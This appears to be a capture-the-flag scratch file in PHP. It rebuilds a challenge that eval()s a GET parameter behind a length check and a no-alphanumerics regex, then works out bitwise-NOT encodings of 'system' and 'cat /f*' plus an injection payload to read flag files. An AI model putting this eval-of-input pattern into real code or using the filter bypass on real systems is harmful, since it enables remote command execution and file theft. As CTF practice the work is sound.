<?php
// payload
$_GET['ヽ(#`Д´)ﾉ'] = "a); system('cat%20/f*');?>";


// echo ~'system';
error_log('~system');
error_log(urlencode(~'system'));
error_log('~ls /');
error_log(urlencode(~'ls /'));
error_log('cat /f*');
error_log(urlencode(~'cat /f*'));

echo '--------------------------------';
echo "<p>🐱: ", $🐱 = $_GET['ヽ(#`Д´)ﾉ'], "</p>";
echo "<p>strlen", strlen($🐱 = $_GET['ヽ(#`Д´)ﾉ']) < 0x0A, "</p>";
echo "<p>!preg_match", !preg_match('/[a-z0-9`]/i', $🐱), "</p>";
echo "<p>eval: ", eval(print_r($🐱, 1)), "</p>";
?>

<?=

highlight_file(__FILE__)
    && strlen($🐱 = $_GET['ヽ(#`Д´)ﾉ']) < 0x0A
    && !preg_match('/[a-z0-9`]/i', $🐱)
    && eval(print_r($🐱, 1));
